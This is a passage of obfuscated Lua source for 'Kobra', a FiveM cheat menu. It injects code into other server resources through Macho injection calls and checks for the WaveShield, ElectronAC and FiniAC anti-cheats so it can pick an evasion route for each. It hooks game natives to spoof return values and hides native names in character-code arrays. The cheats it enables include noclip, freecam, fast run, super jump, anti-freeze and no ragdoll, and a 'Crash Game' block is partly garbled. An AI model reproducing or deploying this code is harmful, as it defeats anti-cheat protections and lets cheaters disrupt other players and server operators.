                                            local dz = math.sin(radP)
                                            local len = math.sqrt(dx*dx + dy*dy + dz*dz)
                                            if len ~= 0 then
                                                dx = dx / len
                                                dy = dy / len
                                                dz = dz / len
                                            end

                                            local speed = _G.KobraNoclipSpeed or 0.25
                                            -- cache control checks to avoid repeating native calls
                                            local sprint = IsControlPressed(0, 21)
                                            local slow = IsControlPressed(0, 19)
                                            if sprint then speed = speed + 1 end
                                            if slow then speed = 0.10 end

                                            local forward = IsControlPressed(0, 32)
                                            local back = IsControlPressed(0, 269)
                                            local left = IsControlPressed(0, 34)
                                            local right = IsControlPressed(0, 9)
                                            local up = IsControlPressed(0, 22)
                                            local down = IsControlPressed(0, 62)

                                            if forward then
                                                coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                            elseif back then
                                                coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                            end

                                            if left then
                                                coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                            elseif right then
                                                coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                            end

                                            if up then
                                                coords = coords + vector3(0.0, 0.0, speed)
                                            elseif down then
                                                coords = coords - vector3(0.0, 0.0, speed)
                                            end

                                            SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                            SetEntityHeading(entity, heading)
                                            ::continue::
                                        end
                                    end)
                                else
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipSpeed = ]]   .. v348   .. [[
                                end
                            ]] );elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(3,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            local function GetRightVector(rot)
                                                local z = math.rad(rot.z)
                                                return vector3(math.cos(z), math.sin(z), 0.0)
                                            end

                                            local function Clamp(val, min, max)
                                                if val < min then return min end
                                                if val > max then return max end
                                                return val
                                            end

                                            local function GetGroundZForCoords(x, y, z)
                                                local found, groundZ = GetGroundZFor_3dCoord(x, y, z, false)
                                                if found then return groundZ end
                                                return z
                                            end

                                            if not _G.inNoClip then
                                                _G.inNoClip = true
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v348   .. [[
                                                _G.noclipCamera = nil
                                                _G.cameraReady = false
                                                _G.originalCoords = nil

                                                local function StartNoclip()
                                                    local playerPed = PlayerPedId()
                                                    _G.originalCoords = GetEntityCoords(playerPed)
                                                    _G.noclipCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                                    SetCamCoord(_G.noclipCamera, _G.originalCoords.x, _G.originalCoords.y, _G.originalCoords.z + 1.0)
                                                    SetCamRot(_G.noclipCamera, 0.0, 0.0, GetEntityHeading(playerPed), 2)
                                                    RenderScriptCams(true, false, 0, true, true)
                                                    SetEntityVisible(playerPed, false, false)
                                                    SetEntityInvincible(playerPed, true)
                                                    SetEntityCollision(playerPed, false, false)
                                                    TaskStandStill(playerPed, -1)
                                                    CreateThread(function()
                                                        Wait(550)
                                                        _G.cameraReady = true
                                                    end)
                                                end

                                                local function Movement()
                                                    if not _G.noclipCamera or not _G.cameraReady then return end
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local camRot = GetCamRot(_G.noclipCamera, 2)
                                                    local speed = _G.KobraNoclipSpeed or ]]   .. v348   .. [[
                                                    if IsControlPressed(0, 21) then speed = speed + 1 end
                                                    if IsControlPressed(0, 19) then speed = 0.10 end
                                                    local forward = RotationToDirection(camRot)
                                                    local right = GetRightVector(camRot)
                                                    local moveX, moveY, moveZ = 0, 0, 0
                                                    if IsControlPressed(0, 32) then
                                                        moveX = moveX + forward.x * speed
                                                        moveY = moveY + forward.y * speed
                                                        moveZ = moveZ + forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 269) then
                                                        moveX = moveX - forward.x * speed
                                                        moveY = moveY - forward.y * speed
                                                        moveZ = moveZ - forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 34) then
                                                        moveX = moveX - right.x * speed
                                                        moveY = moveY - right.y * speed
                                                    end
                                                    if IsControlPressed(0, 9) then
                                                        moveX = moveX + right.x * speed
                                                        moveY = moveY + right.y * speed
                                                    end
                                                    if IsControlPressed(0, 22) then
                                                        moveZ = moveZ + speed
                                                    end
                                                    if IsControlPressed(0, 62) then
                                                        moveZ = moveZ - speed
                                                    end
                                                    SetCamCoord(_G.noclipCamera, camCoords.x + moveX, camCoords.y + moveY, camCoords.z + moveZ)
                                                    local x = GetDisabledControlNormal(0, 1)
                                                    local y = GetDisabledControlNormal(0, 2)
                                                    local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                                                    local newYaw = camRot.z - x * 5
                                                    SetCamRot(_G.noclipCamera, newPitch, camRot.y, newYaw, 2)
                                                    SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
                                                end

                                                CreateThread(function()
                                                    StartNoclip()
                                                    while _G.inNoClip do
                                                        Wait(0)
                                                        if _G.noclipping then
                                                            Movement()
                                                        else
                                                            Wait(500)
                                                        end
                                                    end
                                                end)
                                            else
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v348   .. [[
                                            end
                                        ]] );else MachoInjectResource2(2 + 1 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipSpeed = ]]   .. v348   .. [[
                                            if not _G.KobraNoclipThreadRunning then
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipThreadRunning = true
                                                function hNative(nativeName, newFunction)
                                                    local originalNative = _G[nativeName]
                                                    if not originalNative or type(originalNative) ~= "function" then return end
                                                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                                end
                                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsPedFalling", function(originalFn, ...) return true end)
                                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                                hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                                hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                                hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)
                                                CreateThread(function()
                                                    while _G.KobraNoclipThreadRunning do
                                                        Wait(0)
                                                        if not _G.KobraNoclipEnabled then
                                                            Wait(500)
                                                            goto continue
                                                        end
                                                        local ped = PlayerPedId()
                                                        if not DoesEntityExist(ped) then goto continue end
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        local entity = (vehicle ~= 0 and vehicle) or ped
                                                        if not DoesEntityExist(entity) then goto continue end
                                                        local coords = GetEntityCoords(entity, true)
                                                        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                                        local pitch = GetGameplayCamRelativePitch()
                                                        local dx = -math.sin(heading * math.pi / 180.0)
                                                        local dy = math.cos(heading * math.pi / 180.0)
                                                        local dz = math.sin(pitch * math.pi / 180.0)
                                                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                                                        if len ~= 0 then
                                                            dx, dy, dz = dx / len, dy / len, dz / len
                                                        end
                                                        local speed = _G.KobraNoclipSpeed or 0.25
                                                        if IsControlPressed(0, 21) then speed = speed + 1 end
                                                        if IsControlPressed(0, 19) then speed = 0.10 end
                                                        if IsControlPressed(0, 32) then
                                                            coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 269) then
                                                            coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 34) then
                                                            coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 9) then
                                                            coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 22) then
                                                            coords = coords + vector3(0.0, 0.0, speed)
                                                        end
                                                        if IsControlPressed(0, 62) then
                                                            coords = coords - vector3(0.0, 0.0, speed)
                                                        end
                                                        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                                        SetEntityHeading(entity, heading)
                                                        ::continue::
                                                    end
                                                end)
                                            else
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipSpeed = ]]   .. v348   .. [[
                                            end
                                        ]] );end break;end end elseif (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                    _G.KobraNoclipEnabled = false
                                    _G.KobraNoclipThreadRunning = false
                                ]]);elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(1015 -(53 + 959) ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.inNoClip then
                                                _G.inNoClip = false
                                                _G.noclipping = false
                                                _G.cameraReady = false
                                                local playerPed = PlayerPedId()
                                                if _G.noclipCamera then
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local valid, groundZ = GetGroundZFor_3dCoord(camCoords.x, camCoords.y, camCoords.z, false)
                                                    local targetCoords
                                                    if valid and camCoords.z > -1000.0 and camCoords.z < 10000.0 then
                                                        targetCoords = vector3(camCoords.x, camCoords.y, groundZ + 1.0)
                                                    else
                                                        targetCoords = GetEntityCoords(playerPed)
                                                    end
                                                    SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)
                                                    RenderScriptCams(false, false, 0, true, true)
                                                    DestroyCam(_G.noclipCamera, false)
                                                    _G.noclipCamera = nil
                                                else
                                                    local pedCoords = GetEntityCoords(playerPed)
                                                    SetEntityCoordsNoOffset(playerPed, pedCoords.x, pedCoords.y, pedCoords.z, true, true, true)
                                                end
                                                SetEntityVisible(playerPed, true, true)
                                                SetEntityInvincible(playerPed, false)
                                                SetEntityCollision(playerPed, true, true)
                                                ClearPedTasksImmediately(playerPed)
                                                SetFocusEntity(playerPed)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipEnabled = false
                                            _G.KobraNoclipThreadRunning = false
                                        ]]);end end},{type="slider-checkbox",label="Freecam",scrollType="onScroll",checked=false,value=0.25 -0 ,step=0.25,min=285.25 -(147 + 138) ,max=904 -(813 + 86) ,onSelect=function(v350,v351) v271:ToggleFreecam(v351,v350);end},{type="checkbox",label="Fast Run",checked=false,onSelect=function(v352) if v352 then local v592=0 -0 ;while true do if (v592==0) then v12:Notify("success","Kobra","Fast Run On",3492 -(18 + 474) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.fastRunEnabled then
                                                _G.fastRunEnabled = true

                                                local GetPlayerPed_fn = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                                local SetRun_fn = g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})
                                                local SetPedMove_fn = g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})
                                                local Wait_fn = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[FastRun] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(1)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.fastRunEnabled do
                                                        local ped = GetPlayerPed_fn(-1)
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(ped, 1.49)
                                                            SetPedMove_fn(ped, 1.49)
                                                        end
                                                        Wait_fn(1)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.FastRunActive == nil then _G.FastRunActive = false end
                                            if _G.FastRunThread == nil then
                                                _G.FastRunThread = true

                                                local CreateThread_fn = CreateThread
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetRun_fn = SetRunSprintMultiplierForPlayer
                                                local SetMove_fn = SetPedMoveRateOverride

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait(0)
                                                        if not _G.FastRunActive then
                                                            Wait(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(PlayerId(), 1.49)
                                                            SetMove_fn(ped, 1.49)
                                                        end
                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            _G.FastRunActive = true
                                        ]]);end break;end end else local v593=0 + 0 ;while true do if ((0 -0)==v593) then v12:Notify("error","Kobra","Fast Run Off",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.fastRunEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                return _G[decode(n)]
                                            end
                                            g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                            g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})(g({80,108,97,121,101,114,80,101,100,73,100})(), 1.0)
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.FastRunActive = false
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                            SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                        ]]);end break;end end end end},{type="checkbox",label="Super Jump",checked=false,onSelect=function(v353) local v354=1086 -(860 + 226) ;local v355;local v356;local v357;local v358;local v359;while true do if (v354==(306 -(121 + 182))) then function v358() if  not _G.superJumpEnabled then _G.superJumpEnabled=true;v357({9 + 58 ,13 + 101 ,2071 -(49 + 1921) ,97,199 -83 ,101,24 + 60 ,104,49 + 65 ,101,97,41 + 59 })(function() while _G.superJumpEnabled do v357({75 + 8 ,101,97 + 19 ,83,107 + 10 ,164 -52 ,59 + 42 ,114,74,281 -(149 + 15) ,109,594 -(14 + 468) ,84,290 -186 ,105,25 + 90 ,32 + 38 ,217 -103 ,340 -243 ,160 -(12 + 39) ,101})(v357({80,384 -276 ,29 + 68 ,121,255 -154 ,550 -436 ,190 -117 ,1538 -(1059 + 379) })());Wait(0 -0 );end end);end end v359=nil;v354=3 + 1 ;end if (v354==(0 + 0)) then v355=GetResourceState("WaveShield")=="started" ;v356=nil;v354=1;end if (v354==(393 -(145 + 247))) then function v356(v771) local v772="";for v845=1 + 0 , #v771 do v772=v772   .. string.char(v771[v845]) ;end return v772;end v357=nil;v354=1 + 1 ;end if (v354==2) then function v357(v773) return _G[v356(v773)];end v358=nil;v354=3;end if ((11 -7)==v354) then function v359() _G.superJumpEnabled=false;v357({83,101,116,803 -(254 + 466) ,371 -254 ,365 -(236 + 17) ,79 + 22 ,429 -315 ,74,117,90 + 19 ,5 + 107 ,217 -133 ,177 -73 ,105,340 -225 ,70,114,97,39 + 70 ,163 -62 })(v357({572 -(76 + 416) ,551 -(319 + 124) ,1104 -(564 + 443) ,579 -(337 + 121) ,336 -235 ,2025 -(1261 + 650) ,115 -42 ,15 + 85 })(),145 -(102 + 42) );end if v353 then if v355 then v358();else MachoInjectResourceRaw("any",[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superJumpEnabled then
                                                _G.superJumpEnabled = true
                                                g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                                    while _G.superJumpEnabled do
                                                        g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                        ]]);end elseif v355 then print("off");v359();else MachoInjectResourceRaw("any",[[
                                            _G.superJumpEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                        ]]);end break;end end end}}},{label="Miscellaneous",tabs={{icon="",type="button",label="Crash Game",desc="Crashes your game",onSelect=function() MachoInjectResourceRaw("any",[[
                        function SimpleJsonEncode(value)
                            if type(value) == "table" then
                                local parts = {}
                                local isArray = true
                                local maxIndex = 0

                                for k, _ in pairs(value) do
                                    if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                        isArray = false
                                        break
                                    end
                                    maxIndex = math.max(maxIndex, k)
                                end
                                
                                if isArray then
                                    for i = 1, maxIndex do
                                        local v = value[i]
                                        if v == nil then
                                            parts[i] = "null"
                                        else
                                            parts[i] = SimpleJsonEncode(v)
                                        end
                                    end
                                    return "[" .. table.concat(parts, ",") .. "]"
                                else
                                    for k, v in pairs(value) do
                                        if type(k) == "string" then
                                            local encodedValue = SimpleJsonEncode(v)
                                            parts[#parts + 1] = "\"" .. k .. "\":" .. encodedValue
                                        end
                                    end
                                    return "{" .. table.concat(parts, ",") .. "}"
                                end
                            elseif type(value) == "string" then
                                return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                            elseif type(value) == "number" or type(value) == "boolean" then
                                return tostring(value)
                            elseif value == nil then
                                return "null"
                            else
                                return "\"[unserializable:" .. type(value) .. "]\""
                            end
                        end

                        function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(originalNative, ...)
                            end
                        end

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)
                        ]]);end},{icon="",type="button",label="Clear Screen Effects",desc="Removes all screen effects",onSelect=function() print("Revive");end},{icon="",type="button",label="Suicide",desc="This will kill you.",onSelect=function() local v360=1102 -(67 + 1035) ;local v361;while true do if (v360==1) then v361();break;end if (v360==(348 -(136 + 212))) then v361=nil;function v361() local v774=SetEntityHealth;v774(PlayerPedId(),0 -0 );end v360=1 + 0 ;end end end},{icon="",type="button",label="Force Ragdoll",desc="This will ragdoll.",onSelect=function() MachoInjectResourceRaw("any",[[
                            local function awfAEDSADWEf()
                                local cWAmdjakwDksFD = SetPedToRagdoll
                                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                            end

                            awfAEDSADWEf()
                            ]]);end},{icon="",type="button",label="Remove Crutch",desc="Remove Crutch is the server is using the correct resource",onSelect=function() MachoResourceStop("wasabi_crutch");end},{icon="",type="scrollable",value=1083 -(1050 + 32) ,values={"Primary","Secondary"},label="Clear Tasks",desc="Clears the character's tasks",onSelect=function(v362) if (v362=="Primary") then ClearPedTasksImmediately(PlayerPedId());elseif (v362=="Secondary") then ClearPedSecondaryTask(PlayerPedId());end end},{type="divider",label="Toggles"},{type="checkbox",label="No Ragdoll",checked=false,desc="This will prevent you from being ragdolled from admins or cheaters.",onSelect=function(v363) local v364=GetResourceState("WaveShield")=="started" ;local v365=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v363 then if v364 then v12:Notify("success","Kobra","No Ragdoll Enabled",243 + 2757 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local setCanRagdoll = SetPedCanRagdoll
                                                local setRagdollOnCollision = SetPedRagdollOnCollision
                                                local setRagdollFromImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRagdoll = IsPedRagdoll
                                                local clearTasks = ClearPedTasksImmediately

                                                while noRagdollEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 then
                                                        setCanRagdoll(ped, false)
                                                        setRagdollOnCollision(ped, false)
                                                        setRagdollFromImpact(ped, false)
                                                        if isRagdoll(ped) then
                                                            clearTasks(ped)
                                                        end
                                                    end
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    setCanRagdoll(ped, true)
                                                    setRagdollOnCollision(ped, true)
                                                    setRagdollFromImpact(ped, true)
                                                end
                                            end)
                                        ]]);else v48(v365,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function startNoRagdoll()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local setCan = SetPedCanRagdoll
                                                local setColl = SetPedRagdollOnCollision
                                                local setImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRag = IsPedRagdoll
                                                local clear = ClearPedTasksImmediately

                                                create(function()
                                                    while noRagdollEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 then
                                                            setCan(ped, false)
                                                            setColl(ped, false)
                                                            setImpact(ped, false)
                                                            if isRag(ped) then
                                                                clear(ped)
                                                            end
                                                        end
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 then
                                                        setCan(ped, true)
                                                        setColl(ped, true)
                                                        setImpact(ped, true)
                                                    end
                                                end)
                                            end

                                            startNoRagdoll()
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Enabled (Fallback)",3644 -(269 + 375) );end elseif v364 then local v775=0;while true do if (v775==(725 -(267 + 458))) then v12:Notify("success","Kobra","No Ragdoll Disabled",933 + 2067 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            noRagdollEnabled = false
                                        ]]);break;end end else v48(v365,[[
                                            noRagdollEnabled = false
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Disabled (Fallback)",5769 -2769 );end end},{type="checkbox",label="Anti-Freeze",checked=false,desc="This will prevent you from being frozen.",onSelect=function(v366) local v367=GetResourceState("WaveShield")=="started" ;local v368=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v366 then if v367 then local v776=818 -(667 + 151) ;while true do if (v776==(1497 -(1410 + 87))) then v12:Notify("success","Kobra","Anti-Freeze Enabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clearTasks = ClearPedTasks

                                                while antiFreezeEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 and isFrozen(ped) then
                                                        unfreeze(ped, false)
                                                        clearTasks(ped)
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else v48(v368,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function startAntiFreeze()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clear = ClearPedTasks

                                                create(function()
                                                    while antiFreezeEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 and isFrozen(ped) then
                                                            unfreeze(ped, false)
                                                            clear(ped)
                                                        end
                                                        wait(0)
                                                    end
                                                end)
                                            end

                                            startAntiFreeze()
                                        ]]);v12:Notify("success","Kobra","Anti-Freeze Enabled (Fallback)",3000);end elseif v367 then v12:Notify("error","Kobra","Anti-Freeze Disabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            antiFreezeEnabled = false
                                        ]]);else v48(v368,[[
                                            antiFreezeEnabled = false
                                        ]]);v12:Notify("error","Kobra","Anti-Freeze Disabled (Fallback)",3000);end end},{type="checkbox",label="Force Third Person",checked=false,desc="This will force third person.",onSelect=function(v369) if v369 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                                kJfGhTrEeWqAsDz = true

                                local function pqkTRWZ38y()
                                    local gKdNqLpYxMiV = CreateThread
                                    gKdNqLpYxMiV(function()
                                        while kJfGhTrEeWqAsDz and not Unloaded do
                                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                                            qWeRtYuIoPlMnBv(0)
                                            aSdFgHjKlQwErTy(0)
                                            Wait(0)
                                        end
                                    end)
                                end

                                pqkTRWZ38y()
